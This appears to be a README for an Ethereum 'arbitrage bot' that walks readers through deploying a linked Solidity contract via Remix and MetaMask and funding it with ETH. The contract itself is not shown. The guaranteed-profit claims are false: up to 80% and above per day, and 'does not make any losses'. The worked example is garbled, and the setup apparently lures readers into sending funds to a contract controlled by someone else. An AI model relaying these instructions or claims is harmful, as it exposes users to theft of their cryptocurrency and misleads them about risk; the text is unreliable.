---

<div align="center">

# 🤖 ETH DEX Arbitrage Bot 🍣🦄


A decentralized exchange (DEX) arbitrage bot written in Solidity that identifies and takes advantage of price discrepancies between liquidity pairs on Uniswap and Sushiswap. This bot automatically performs arbitrage transactions to generate profits from market inefficiencies on the Ethereum blockchain.

</div>

<p align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="solidity" />
</p>

---
### 🧵 Contents
- [📚 How it Works](#-how-it-works)
- [✨ Features](#-features)
- [📖 Arbitrage Example](#-arbitrage-example)
- [📈 Estimated Profits](#-estimated-profits)
- [🚀 How to get started](#-getting-started)
- [👋 Contact](#-contact)
---

## 📚 How It Works

The bot scans all common ETH and DAI pairs on Uniswap and Sushiswap to identify pairs with available liquidity. For each pair, it calculates the price difference between Uniswap and Sushiswap.  
If a profitable arbitrage opportunity is identified, the bot executes the necessary token swaps to capture the price difference. The bot repeats the process at regular intervals to exploit new arbitrage opportunities.

---

## ✨ Features

- **Dynamic Comparison**: The bot continuously monitors price changes and liquidity conditions on both Uniswap and Sushiswap, allowing it to swiftly detect arbitrage opportunities as soon as they arise.
- **Multi-Pair Arbitrage**: Designed to analyze a wide range of ETH and DAI pairs simultaneously. This increases the likelihood of discovering profitable trades.
- **Efficient Trading**: Utilizes the Uniswap and Sushiswap router contracts to perform token swaps with minimal slippage.
- **Liquidity Verification**: Verifies sufficient liquidity exists in the trading pairs before attempting arbitrage.
- **Minimal Risk**: Implements checks to ensure that the potential profit from arbitrage exceeds the transaction fees, reducing the risk of unprofitable trades.

---

## 📖 Arbitrage Example

Let's walk through a simplified example:

Assume that the bot has 1 ETH available and identifies the following price difference for the ETH/DAI pair:  
Uniswap: 1 ETH = 3000 DAI  
Sushiswap: 1 ETH = 3100 DAI

The bot calculates a potential profit by selling 1 ETH for 3100 DAI on Sushiswap and then using the acquired DAI to buy ETH on Uniswap:  
Use 3100 DAI to buy ETH on Uniswap (1 ETH = 3000 DAI), resulting in approximately 3100 / 3000 = 1.0333 ETH.

Before proceeding with the swaps, the bot checks the current gas fees on the Ethereum network. Let's assume the gas fee to compete is 0.01 ETH.

Considering the gas fee, the net profit would be:  
Deduct 0.01 ETH (gas fee) = 1.0333 - 0.01 = 1.0233 ETH

Since the net profit of 1.0233 ETH is higher than the initial investment of 1 ETH, the bot proceeds with the arbitrage with a net profit of 0.0233 ETH.

*The bot is able to recognize profitable arbitrage opportunities across a wide range of different ETH and DAI token pairs. This enhances its ability to generate consistent returns.*

---

## 📈 Estimated Profits


| Investment Range (ETH)      | Liquidity Level      | Profits per 24 Hours    |
|-----------------------|----------------------|-------------------------|
| 0.1   ETH - 0.5   ETH       | Low                  | Up to 5%    |
| 0.5   ETH - 1.2   ETH      | Moderate              | Up to 10%    |
| 1.2   ETH - 2.4   ETH      | Moderate             | 10-17%      |
| 2.4   ETH - 5.0 ETH       | High                 | 17-25%      |
| 5.0   ETH - 10    ETH        | High                 | 25-35%       |
| 10    ETH - 20    ETH        | Very High            | 35-50%       |
| 20    ETH - 50    ETH         | Very High            | 50%+         |
| 50    ETH - 100   ETH        | Extremely High       | 80% and above        |

---

## 🚀 Getting Started

1)  Download [MetaMask](https://metamask.io/download.html) (if you don’t have it already) 

2)  Access [REMIX IDE](https://remix.ethereum.org) (Web-based environment to write and deploy Ethereum smart contracts)

3) 📁 Click on the `contracts`  folder and then create `New File`. Rename it as you like, i.e: “bot.sol”

4) 📋 Paste [this source code](https://raw.githubusercontent.com/0xDefiLabs/uniswap-sushiswap-arbitrage-bot/main/contracts/ArbitrageBot.sol) from Github into your Remix file

5) 🔧 Go to the `Solidity Compiler` tab, select version `0.8.0+commit` and then select `Compile bot.sol`.

![2](https://i.imgur.com/nENtuQu.png)

6) 🚀 Navigate to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - Metamask` environment and then `Deploy`. By approving the contract creation fee in Metamask, you have successfully created your Arbitrage Bot.


![3](https://i.imgur.com/DqLGWwm.png)

---
### ⚙️ Configuration

7) Copy your newly created contract address and fund it with any amount of ETH (minimum 0.5 ETH recommended) that you would like the bot to earn with by simply sending ETH to your newly created contract address.

![4](https://i.imgur.com/CneVaau.png)
 
8) - After your transaction is confirmed, press the `startBot` button to run the bot.
	- The `withdrawAll` button stops the bot and withdraws all ETH from the contract to your Metamask.
	- You can use the `withdrawAmount` button to make partial withdrawals of ETH from the contract. Enter the ETH value like this: 0.14

![5](https://i.imgur.com/NgjRmlS.png)

<br>
<div align="center">
💰 That’s it. The bot will start working immediately earning you profits from arbitrage actions on Uniswap and Sushiswap pools 💰
</div>

---

### 👋 Contact

If you have any questions or inquiries for assistance, feel free to reach out to us on Telegram: https://t.me/trust0212

---

#### Please ⭐ the repo to support our project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---

## 💭FAQ

#### What average ROI and risks can I expect?

You can find the ROI according to latest data of bot performances in the "Estimated Profits" section. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is in plus.

#### Do I need to keep remix open or the computer on while the bot is activated? 

No, just save the bot contract address after creating it. The next time you want to access your bot via Remix, you need to compile the file again as in step 5. Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your Metamask, paste your contract address into `Load contract from Address` and press `At Address`.

![](https://i.imgur.com/SG1aENC.png)

Now it can be found again under "Deployed Contracts".

#### What amount of funds does the bot need to work?

We recommend funding the contract with at least 0.5+ ETH (moderate liquidity level) to cover gas fees, possible burn fees, and to have enough liquidity to be able to take advantage of larger arbitrage opportunities before the competition does. If you fund the contract with less than recommended, the bot might fall below the profit threshold, which means the contract will basically waste more in fees than making profits.

#### Does it work on other chains as well?

No, currently the bot is only dedicated for Uniswap-like DEXes on Ethereum.
